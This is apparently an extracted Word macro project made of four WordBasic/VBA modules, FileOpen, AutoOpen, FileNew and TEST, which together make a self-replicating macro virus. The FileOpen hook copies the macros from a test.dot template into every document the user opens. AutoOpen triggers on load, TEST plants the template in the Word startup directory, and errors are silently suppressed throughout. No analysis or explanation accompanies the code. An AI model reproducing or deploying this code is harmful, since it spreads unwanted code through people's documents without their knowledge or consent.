   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "FileOpen"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "??????????"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileOpen.MAIN"
   Dim s$
   Dim fn$
   Dim cm1
   Dim j
   Dim tt
   On Error Resume Next
   s$ = WordBasic.[DefaultDir$](8) + "\test.dot"
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
   WordBasic.CurValues.FileOpen dlg
   WordBasic.Dialog.FileOpen dlg
   WordBasic.FileOpen dlg
   fn$ = dlg.Name
   cm1 = WordBasic.CountMacros(1)
   If cm1 > 0 Then
      For j = 1 To cm1
         If WordBasic.[MacroName$](j, 1) = "TEST" Then tt = 1
      Next j
   End If
   If tt <> 1 Then
      WordBasic.FileSaveAs Format:=1
      WordBasic.MacroCopy s$ + ":TEST", fn$ + ":TEST"
      WordBasic.MacroCopy s$ + ":AutoOpen", fn$ + ":AutoOpen"
      WordBasic.MacroCopy s$ + ":FileOpen", fn$ + ":AutoOpen"
      WordBasic.MacroCopy s$ + ":FileNew", fn$ + ":FileNew"
   End If
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   WordBasic.Call "test"
   End Sub

   Attribute VB_Name = "FileNew"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "????????"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileNew.MAIN"
   Dim n
   Dim a$
   Dim s$
   On Error GoTo -1: On Error GoTo exit_
   n = WordBasic.Second(WordBasic.Now())
   a$ = WordBasic.[Right$](Str(n), 1)
   s$ = WordBasic.[DefaultDir$](8) + "\test.dot"
   WordBasic.FileNew Template:=s$, NewTemplate:=1
   WordBasic.FileSaveAs Format:=1, Name:="DOC" + a$ + ".doc"
   exit_:
   End Sub

   Attribute VB_Name = "TEST"

   Public Sub MAIN()
   Dim fn$
   Dim s$
   Dim cm
   Dim i
   Dim t
   On Error GoTo -1: On Error GoTo exit_
   fn$ = WordBasic.[FileName$]()
   s$ = WordBasic.[DefaultDir$](8) + "\test.dot"
   cm = WordBasic.CountMacros(0, 0, 1)
   If cm > 0 Then
      For i = 1 To cm
         If WordBasic.[MacroName$](i, 0, 0, 1) = "TEST" Then t = 1
      Next i
   End If
   If t <> 1 Then
     WordBasic.FileSaveAs Name:=s$, Format:=1
   End If

   exit_:
   End Sub
